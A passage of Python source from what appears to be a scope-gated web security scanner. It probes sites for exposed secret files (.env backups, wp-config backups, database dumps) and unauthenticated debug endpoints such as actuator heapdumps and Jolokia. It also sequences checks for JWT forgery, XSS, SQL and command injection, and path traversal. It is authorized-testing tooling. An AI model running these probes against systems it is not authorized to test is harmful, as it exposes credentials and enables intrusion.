                        r"^\s*(?:DROP TABLE IF EXISTS|CREATE TABLE)\s|^\s*INSERT INTO\s+[`\"']?\w"),
       f"{path} (database dump)") for path in ("/backup.sql", "/dump.sql")),
    # A served .env BACKUP variant — same secrets shape as .env, at a name that dodges a bare-.env block.
    *((path, re.compile(r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\S"), f"{path} (application secrets/config)")
      for path in ("/.env.bak", "/.env.local")),
    # A served WordPress wp-config.php BACKUP — raw PHP exposing the DB_PASSWORD/DB_USER define()s
    # (the source is returned instead of executed because the .bak suffix isn't handled by PHP).
    ("/wp-config.php.bak", re.compile(r"""(?im)^\s*define\s*\(\s*['"]DB_(?:PASSWORD|USER|HOST|NAME)['"]"""),
     "wp-config.php.bak (WordPress DB credentials)"),
)


def _check_sensitive_paths(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm a high-signal file is served (.git/config, .env) by fetching it at the origin root
    and gating on the file's own signature PLUS a catch-all control (a path that shouldn't exist)
    — so an app that 200s everything can't false-positive. Runs only for the site root, so it
    probes each host's paths once, not per discovered URL. GET-only, read-only."""
    parts = urlparse(url)
    if (parts.path or "/").strip("/"):
        return None  # only at the site root -> one probe set per host, not per discovered URL
    origin = f"{parts.scheme}://{parts.netloc}"
    try:
        control = http.fetch(f"{origin}/{_MARK}-nonexistent-{_MARK}")
    except _ActiveError:
        return None
    ctrl_body = control.get("body") or ""
    for path, signature, name in _EXPOSED_FILES:
        if signature.search(ctrl_body):
            continue  # the catch-all already carries this signature -> not a genuinely served file
        try:
            probe = http.fetch(f"{origin}{path}")
        except _ActiveError:
            break
        body = probe.get("body") or ""
        status = int(probe.get("status") or 0)
        if 200 <= status < 300 and signature.search(body) and body != ctrl_body:
            proof = _proof(
                "confirmed", method=f"GET {path}",
                affected_asset="source/config/secrets served directly by the web server",
                observed_result=f"{name} is served at {path} (HTTP {status}) with its characteristic contents",
                control_result="a non-existent control path did NOT return this content — the file is genuinely exposed, not a catch-all 200",
                evidence=f"the response body carries the unmistakable {name} signature",
            )
            ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}", "matched_value": f"{name} exposed",
                  # The served file content IS the demonstrated exposure (secrets redacted once by _finding).
                  "read_data": body[:1200]}
            return _finding("active.exposed-file", f"Sensitive file exposed: {path}", "high", "disclosure", "disclosure", url, proof, ev)
    return None


# Unauthenticated debug/management/registry endpoints that leak secrets, map backend internals, or
# grant code execution. Each is confirmed by an UNMISTAKABLE product signature AND the catch-all
# control (like _EXPOSED_FILES), so an app that 200s everything can't false-positive. (path,
# signature, name, severity, class, impact). Ordered most-severe first so the worst exposure on a
# host is the one reported.
_DEBUG_ENDPOINTS: tuple[tuple[str, "re.Pattern[str]", str, str, str, str], ...] = (
    # The HPROF magic is ANCHORED to the start of the response (\A) + the version framing, so a docs
    # / blog / soft-404 page that merely contains the words "JAVA PROFILE" mid-body cannot match —
    # only a real heap dump (which BEGINS with "JAVA PROFILE 1.0.x\0") does.
    ("/actuator/heapdump", re.compile("\\AJAVA PROFILE 1\\.0\\.\\d"), "Spring Boot actuator heap dump", "critical", "disclosure",
     "an unauthenticated full JVM heap dump — every in-memory secret, token, and active session is downloadable"),
    ("/jolokia/list", re.compile(r'"request"[\s\S]{0,200}"type"\s*:\s*"list"[\s\S]{0,4000}"value"'),
     "Jolokia JMX-over-HTTP endpoint", "critical", "rce",
     "Jolokia exposes JMX over HTTP unauthenticated — MBean operations can be abused to load and execute remote code (RCE)"),
    ("/actuator/env", re.compile(r'"propertySources"'), "Spring Boot actuator env", "high", "disclosure",
     "the application's full configuration (property sources — commonly DB credentials, API keys, tokens) is exposed unauthenticated"),
    ("/actuator/logfile", re.compile(r"(?im)^\d{4}-\d{2}-\d{2}[ T][^\r\n]{0,120}\b(?:TRACE|DEBUG|INFO|WARN|ERROR)\b"),
     "Spring Boot actuator logfile", "high", "disclosure",
     "application logs are exposed unauthenticated - logs commonly contain session identifiers, stack traces, API errors, and operational secrets"),
    ("/phpinfo.php", re.compile(r"(?is)(?=.*<title>\s*phpinfo\(\)\s*</title>)(?=.*PHP Version)(?=.*Configuration File)"),
     "PHP phpinfo() diagnostic page", "high", "disclosure",
     "phpinfo() exposes server paths, loaded extensions, environment variables, and configuration values that often include credentials or deployment secrets"),
    ("/_profiler/phpinfo", re.compile(r"(?is)(?=.*<title>\s*phpinfo\(\)\s*</title>)(?=.*PHP Version)(?=.*Configuration File)"),
     "Symfony profiler phpinfo() diagnostic page", "high", "disclosure",
     "the Symfony profiler exposes phpinfo() unauthenticated, revealing runtime configuration, environment variables, and deployment internals"),
    ("/debug/vars", re.compile(r'(?is)(?=.*"cmdline"\s*:\s*\[)(?=.*"memstats"\s*:\s*\{)'),
     "Go expvar debug variables", "high", "disclosure",
     "Go expvar runtime variables are exposed unauthenticated - command line, counters, build/runtime state, and custom application variables can disclose internals or secrets"),
    ("/debug/pprof/goroutine?debug=1", re.compile(r"(?im)^goroutine\s+\d+\s+\[[^\]]+\]:|runtime\.goexit|net/http/pprof"),
     "Go pprof goroutine dump", "high", "disclosure",
     "Go pprof is exposed unauthenticated - stack traces and profiles reveal sensitive routes, internal services, goroutines, and operational state"),
    ("/v2/_catalog", re.compile(r'(?is)^\s*\{\s*"repositories"\s*:\s*\['),
     "Docker Registry catalog", "high", "disclosure",
     "the Docker Registry catalog is anonymously listable, exposing container image names that can reveal source, services, environments, and deployment supply-chain targets"),
    ("/api/v1/namespaces", re.compile(r'(?is)^\s*\{\s*"kind"\s*:\s*"NamespaceList"[\s\S]{0,2000}"items"\s*:\s*\['),
     "Kubernetes namespace list", "high", "disclosure",
     "the Kubernetes API server lists cluster namespaces unauthenticated, exposing workload organization and confirming broad control-plane read surface"),
    ("/server-status?auto", re.compile(r"(?im)^Total Accesses:\s*\d+\s*$[\s\S]{0,2000}^BusyWorkers:\s*\d+\s*$"),
     "Apache mod_status server-status", "medium", "disclosure",
     "Apache mod_status is exposed unauthenticated, leaking live worker, vhost, request, and backend operational details useful for attack chaining"),
    ("/actuator", re.compile(r'"_links"[\s\S]{0,4000}/actuator'), "Spring Boot actuator index", "medium", "disclosure",
     "the actuator endpoint index is exposed, mapping further sensitive management endpoints (env, heapdump, mappings)"),
    # Elasticsearch _cat/indices?v — the header row is anchored (`health status index ...`), so only a
    # real _cat table matches, not a docs page. An anonymously-listable ES cluster is a serious exposure.
    ("/_cat/indices?v", re.compile(r"(?im)^health\s+status\s+index\s+"), "Elasticsearch _cat/indices", "high", "disclosure",
     "the Elasticsearch _cat API responds unauthenticated, listing every index (data-store names, document "
     "counts, sizes) — the cluster's data is queryable without authentication"),
    # WordPress REST user enumeration — a leading array-of-objects whose first object carries BOTH a
    # "slug" and the WP-user-specific "avatar_urls" key, matched ORDER-INDEPENDENTLY via lookaheads (WP
    # core emits name/link BEFORE slug, and single-author sites are the highest-value case). avatar_urls
    # keeps it WP-specific so an arbitrary slug-bearing JSON array can't match. Leaks login names.
    ("/wp-json/wp/v2/users", re.compile(r'(?is)\A\s*\[\s*\{(?=[\s\S]*?"slug"\s*:\s*"[^"]+")(?=[\s\S]*?"avatar_urls"\s*:)'),
     "WordPress REST user enumeration", "medium", "disclosure",
     "the WordPress REST API lists user accounts (login slugs and display names) unauthenticated, handing "
     "an attacker the valid usernames for targeted password / credential-stuffing attacks"),
)


def _check_debug_endpoints(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm an unauthenticated debug/management/registry endpoint is served by fetching it at
    the origin root and gating on the product's own signature PLUS a catch-all control, so an app
    that 200s everything can't false-positive. Root-only (one probe set per host), GET-only, and
    read-only. Critical endpoints prove direct secret exfiltration or RCE reachability; high
    endpoints prove unauthenticated runtime/config/source/supply-chain disclosure."""
    parts = urlparse(url)
    if (parts.path or "/").strip("/"):
        return None  # only at the site root -> one probe set per host, not per discovered URL
    origin = f"{parts.scheme}://{parts.netloc}"
    try:
        control = http.fetch(f"{origin}/{_MARK}-nonexistent-{_MARK}")
    except _ActiveError:
        return None
    ctrl_body = control.get("body") or ""
    for path, signature, name, severity, class_hint, why in _DEBUG_ENDPOINTS:
        if signature.search(ctrl_body):
            continue  # the catch-all already carries this signature -> not a genuinely served endpoint
        try:
            probe = http.fetch(f"{origin}{path}")
        except _ActiveError:
            break
        body = probe.get("body") or ""
        status = int(probe.get("status") or 0)
        if 200 <= status < 300 and signature.search(body) and body != ctrl_body:
            # What this check captures is always the same thing: the endpoint is SERVED, unauthenticated,
            # and the catch-all control rules out an app that 200s everything. For the disclosure entries
            # that IS the impact — the heap dump, the env listing and the log file are the secrets, and
            # the captured body is the artifact. For the one entry classed `rce`, exposure is a precursor
            # rather than the act: the class routes it through the RCE impact model (and its 9.8 vector),
            # so the proof has to say plainly that nothing was executed. Reporting reachability as
            # demonstrated execution is the exact over-claim the evidence rule exists to prevent, and a
            # triager who reproduces this sees an exposed management port, not a running command.
            limitations = ("" if class_hint != "rce" else
                           f"Proves only that {name} answers unauthenticated at {path}. NOTHING was executed and no "
                           f"MBean operation was invoked — the RCE classification is the documented reachability of "
                           f"this endpoint, not a demonstrated code execution. Invoke one concrete, benign operation "
                           f"(and stay inside the program's rules) before reporting this as proven RCE.")
            proof = _proof(
                "confirmed", method=f"GET {path}",
                affected_asset=why,
                observed_result=f"{name} is served unauthenticated at {path} (HTTP {status}) with its characteristic response",
                control_result="a non-existent control path did NOT return this content — the endpoint is genuinely exposed, not a catch-all 200",
                evidence=f"the response carries the unmistakable {name} signature",
                limitations=limitations,
            )
            ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}",
                  "matched_value": f"{name} exposed at {path}", "read_data": body[:1200]}
            return _finding("active.debug-endpoint", f"{name} exposed unauthenticated: {path}",
                            severity, "disclosure", class_hint, url, proof, ev)
    return None


def verify_active(
    target_url: str,
    findings: list[dict[str, Any]],
    *,
    scope: str = "",
    requests_budget: int = _DEFAULT_REQUESTS_BUDGET,
    settings: Any = None,
    governor: HostRateGovernor | None = None,
    http: _Http | None = None,
    time_based: bool = False,
    auth: AuthContext | None = None,
    extra_params: list[str] | None = None,
    class_priority: list[str] | None = None,
    xss_params: list[str] | None = None,
    only_classes: list[str] | None = None,
) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    """Run the active checks against an in-scope target. Returns
    ``(active_findings, meta)``. ``active_findings`` are confirmed/candidate finding
    dicts carrying a ``_active_proof`` for the orchestrator to merge; ``meta`` records
    the authorization/scope/budget outcome for the report.

    ``extra_params`` are parameter NAMES recon discovered for this host (mined from the
    target's own JS/HTML). The param-keyed checks probe URL params UNION these, so an
    endpoint that carries no query string itself still gets its real parameters tested —
    the surface recon found but the prover previously ignored.

    ``only_classes`` RESTRICTS the suite to those classes instead of merely reordering it
    (see ``_restrict_to_classes``), so a caller that already knows which hypothesis it is
    chasing does not re-pay for the other ~24 checks. Fail-open and spend-reducing only; the
    opt-in timing probes below are deliberately never restricted, because the operator asked
    for those explicitly rather than a planner inferring them."""
    settings = settings or get_settings()
    discovered_params = _clean_param_names(extra_params)
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return [], {"in_scope": False, "skipped_reason": str(exc), "host": "", "requests_used": 0, "rate_limited": False, "verified_classes": []}
    host = urlparse(normalized).hostname or ""

    # Scope binding FIRST (no DNS, fail-closed): an unnamed host never gets probed.
    if not host_in_active_scope(host, scope, settings):
        return [], {
            "in_scope": False, "host": host, "requests_used": 0, "rate_limited": False, "verified_classes": [],
            "skipped_reason": f"'{host}' was not named in the hunt scope, so active verification was skipped (passive only). "
                              "Name the host in Scope, set GREYIQ_ACTIVE_SCAN_ALLOWLIST, or scan your own infra with GREYIQ_SCAN_ALLOW_PRIVATE_URLS=1.",
        }
    # Then the same SSRF/private/port guard the passive scanner uses (this resolves DNS).
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return [], {"in_scope": True, "host": host, "requests_used": 0, "rate_limited": False, "verified_classes": [], "skipped_reason": f"target refused by the URL guard: {exc}"}
    host = urlparse(sanitized).hostname or host

    governor = governor or HostRateGovernor(
        capacity=settings.active_max_requests_per_host,
        min_interval_s=settings.active_min_interval_ms / 1000.0,
    )
    http = http or _Http(settings, governor, max_requests=requests_budget, auth=auth)

    # Fetch the landing page once so header-only checks (clickjacking) reuse it.
    landing: dict[str, Any] | None = None
    rate_limited = False
    try:
        landing = http.fetch(sanitized)
    except _RateLimited:
        rate_limited = True
    except _ActiveError:
        landing = None

    results: list[dict[str, Any]] = []
    # A JWT the TARGET ITSELF handed back in the landing response (Set-Cookie / body / header) — reused
    # by the alg:none check when the operator supplied no JWT credential, so it can test the app's OWN
    # token for a signature-verification bypass. Extracted from a response already fetched (no request);
    # the check re-validates the token authenticates before proving anything, so a stray token is a no-op.
    # This runs OUTSIDE the per-check try/except below, so belt-and-suspenders: a malformed landing
    # body (e.g. a crafted token whose header blows the recursion limit) must never abort the pass.
    try:
        discovered_jwt = _extract_jwt_token(landing)
    except Exception:  # noqa: BLE001 - a crafted landing body is a no-op, never a crash
        discovered_jwt = ""
    # Order: header-only first (cheap), then the request-heavier probes. Each check
    # is wrapped so a budget exhaustion stops cleanly without raising.
    # Each check is tagged with the normalized vuln class it confirms, so the reasoning layer's
    # per-endpoint priorities can promote the classes most likely to hit on THIS target (see below).
    # EVERY tag below MUST be a member of prover_classes.PROVER_CLASSES — that frozenset is the
    # vocabulary the hunt planners (hunt_brain / offline_hunt) are allowed to propose, and a tag they
    # cannot name is a class the hunt can never steer budget toward. test_active_verify_service
    # re-derives this list with `ast` and fails the suite if a new check introduces an unlisted tag.
    checks: list[tuple[str, Callable[[], dict[str, Any] | None]]] = [
        ("clickjacking", lambda: _check_clickjacking(http, sanitized, landing)),
        ("csrf", lambda: _check_csrf(landing, sanitized)),
        # Self-gated cheap checks run FIRST so the network-heavy probes below can't exhaust the
        # request budget before they're reached: alg:none fires on the operator's OR the target's own
        # JWT (weak-secret cracks the HMAC key OFFLINE and spends requests only on a hit), and GraphQL
        # introspection only fires on a graphql-shaped path.
        ("jwt", lambda: _check_jwt_alg_none(http, sanitized, discovered_token=discovered_jwt)),
        ("jwt", lambda: _check_jwt_alg_confusion(http, sanitized, discovered_token=discovered_jwt)),
        ("jwt", lambda: _check_jwt_weak_secret(http, sanitized, discovered_token=discovered_jwt)),
        # Embedded-key forgery: the token carries the public half of a key we just generated, so a
        # verifier that trusts the jwk header validates a token we signed. Unlike the jku/x5u probe in
        # oob_service it needs no collaborator and no hosted key, so it is the one total-forgery check
        # that fires on a hunt with no out-of-band infrastructure configured at all.
        ("jwt", lambda: _check_jwt_jwk_embedded(http, sanitized, discovered_token=discovered_jwt)),
        ("graphql", lambda: _check_graphql_introspection(http, sanitized)),
        # Schema disclosure via error field-suggestions — fires even when introspection is disabled,
        # so it catches the leak the introspection check misses. Graphql-path-gated, one benign query.
        ("graphql", lambda: _check_graphql_field_suggestions(http, sanitized)),
        ("cors", lambda: _check_cors(http, sanitized)),
        ("redirect", lambda: _check_open_redirect(http, sanitized, discovered_params)),
        ("host-header", lambda: _check_host_header(http, sanitized)),
        ("xss", lambda: _check_reflected_xss(http, sanitized, discovered_params, priority=xss_params)),
        # Context-aware XSS runs right after the element-content check — catches the JS-string /
        # attribute breakouts that check structurally can't confirm.
        ("xss", lambda: _check_reflected_xss_context(http, sanitized, discovered_params, priority=xss_params)),
        ("ssti", lambda: _check_ssti(http, sanitized, discovered_params)),
        # OS command injection via benign $(expr) shell substitution — arithmetic only, no real command
        # runs. Sits next to SSTI (both are safe arithmetic-echo injection probes) and ahead of the SQLi
        # variants.
        #
        # ORDER IS NO LONGER WHAT DECIDES WHETHER THIS RUNS, and that is the point. Under the old
        # 12-request ceiling the param-keyed probes ran to exhaustion in sequence, so whichever check
        # was ordered last fired zero probes — on a parametered URL the landing fetch plus cors /
        # redirect / host-header and the two XSS passes reached the ceiling before this one was
        # reached, and the highest-severity class in the suite was never tested. Ordering cannot fix
        # that; it only chooses which class starves, and an earlier draft of this release moved the
        # check up and starved reflected XSS instead (the E2E suite caught it immediately). A reserved
        # first-parameter slot was tried next and was worse: registering the check twice emitted TWO
        # critical findings for one endpoint when two parameters were injectable, and it silently stole
        # the two requests the fixed-budget re-verify path needed to reach XSS. The budget is what was
        # wrong, so the budget is what was fixed — see _DEFAULT_REQUESTS_BUDGET. This check keeps its
        # tuned position, and a pass that can afford the suite now reaches it.
        ("rce", lambda: _check_rce_command_injection(http, sanitized, discovered_params)),
        ("sqli", lambda: _check_error_sqli(http, sanitized, discovered_params)),
        ("sqli", lambda: _check_bool_sqli(http, sanitized, discovered_params)),
        ("nosqli", lambda: _check_nosqli(http, sanitized, discovered_params)),
        ("crlf", lambda: _check_crlf(http, sanitized, discovered_params)),
        # Open-bucket is GET-only and scope-gated; safe in the default pass.
        ("cloud-exposure", lambda: _check_open_bucket(http, landing, scope, settings)),
        # Sensitive-file exposure (.git/.env) only probes at the site root, so it's one cheap
        # set per host; signature + catch-all control keeps it false-positive-proof.
        ("sensitive", lambda: _check_sensitive_paths(http, sanitized)),
        # Unauthenticated debug/management endpoints (Spring actuator heapdump/env, Jolokia JMX)
        # — critical secret-exfil / RCE, root-only, same signature + catch-all control gate.
        ("debug", lambda: _check_debug_endpoints(http, sanitized)),
        # WebSocket cross-site hijacking (CSWSH) — low severity and path-gated (fires only on a
        # WebSocket-shaped endpoint or one whose landing announced an upgrade), so it sits LATE and
        # normally costs nothing: one benign RFC-6455 handshake with a cryptographic negative control.
        ("websocket", lambda: _check_cswsh(http, sanitized, landing)),
        # Path traversal / LFI reads ONE well-known system file as proof (signature + control),
        # extracting nothing else; GET-only. Heaviest of the new checks, so it normally runs last
        # and only uses whatever request budget the earlier checks left. When time_based=True below,
        # it is shifted after the opt-in timing proofs so the executing proof checks the operator
        # explicitly requested cannot be starved by this heavier file-read sweep.
        ("path-traversal", lambda: _check_path_traversal(http, sanitized, discovered_params)),
    ]
    # Reasoning-steered SELECTION, then ordering. The restriction runs first so the priority sort
    # ranks only what will actually run; both are pure and neither can add a check the list above
    # does not already define.
    checks = _restrict_to_classes(checks, only_classes)
    # Promote the classes the brain flagged as most likely to hit on THIS endpoint so the shared
    # request budget is spent where a real bug is most likely. It only REORDERS (never adds/removes
    # a check) and preserves the tuned default order within each group.
    checks = _apply_class_priority(checks, class_priority)
    # The time-based checks are the only ones that emit an executing payload (a bounded SLEEP /
    # sleep), so they are OPT-IN. They run after the lightweight/static-differential checks and are
    # never promoted by class_priority. The heavier LFI sweep is deferred behind them on opt-in
    # timing hunts so requested exploitability proofs cannot be starved by a broad file-read pass.
    if time_based:
        path_checks = [ck for ck in checks if ck[0] == "path-traversal"]
        checks = [ck for ck in checks if ck[0] != "path-traversal"]
        checks.append(("rce", lambda: _check_time_rce(http, sanitized, settings, discovered_params)))
        checks.append(("sqli", lambda: _check_time_sqli(http, sanitized, settings, discovered_params)))
        checks.extend(path_checks)
    # (suite tag, finding) for the probe digest. The tag is NOT the finding's class hint: a check
    # reports the class of the IMPACT it found (clickjacking emits "headers", the debug-endpoint
    # check emits "rce"/"secrets"), while the re-planner needs the name of the CHECK to promote or
    # restrict. Keeping them side by side here avoids stamping another key onto the finding dicts.
    tagged: list[tuple[str, dict[str, Any]]] = []
    for _cls, check in checks:
        if rate_limited:
            break
        try:
            result = check()
        except _RateLimited:
            rate_limited = True
            break
        except (_ActiveError, WebsiteFetchError):
            # _Http.fetch() funnels every request through normalize_website_url() /
            # _guard_url() inside guarded_dns_scope() -- a URL that grew past
            # MAX_URL_LENGTH once THIS check appended its injected marker, or a host
            # whose DNS answer changed to something private/reserved between the
            # initial guard and this later request, raises WebsiteFetchError (a
            # ValueError subclass), not _ActiveError. Skip just this one check, same
            # as any other per-request failure -- it must never abort every check
            # ordered after it.
            result = None
        if result:
            results.append(result)
            tagged.append((_cls, result))

    verified = sorted({r["_active_class_hint"] for r in results if r.get("_active_proof", {}).get("status") == "confirmed"})
    meta = {
        "in_scope": True, "host": host, "requests_used": getattr(http, "sent", 0),
        "rate_limited": rate_limited, "verified_classes": verified,
        "discovered_params_used": len(discovered_params),
        # Deterministic, redacted STRUCTURAL digest of the landing response (JSON key names, form
        # fields, security headers, cookie flag gaps, JWT header shape, error family) — built from a
        # response already fetched (no new request). It lets the re-plan brain reason about THIS
        # target's real structure instead of a 200-char excerpt; it carries no value and confirms
        # nothing. Empty dict when the landing fetch failed or nothing structural was present.
        "digest": digest_builder.build_digest(landing),
        # What THIS pass provoked, rather than what the landing page always looks like. The digest
        # above is identical on every call against one URL, so a caller looping over verify_active
        # learns nothing from it; this one moves as the probes move. Derived from `results`, so no
        # request and no claim — `verified` above remains the only statement about what was proven.
        "probe_digest": digest_builder.build_probe_digest(tagged),
        "skipped_reason": "",
    }
    return results, meta
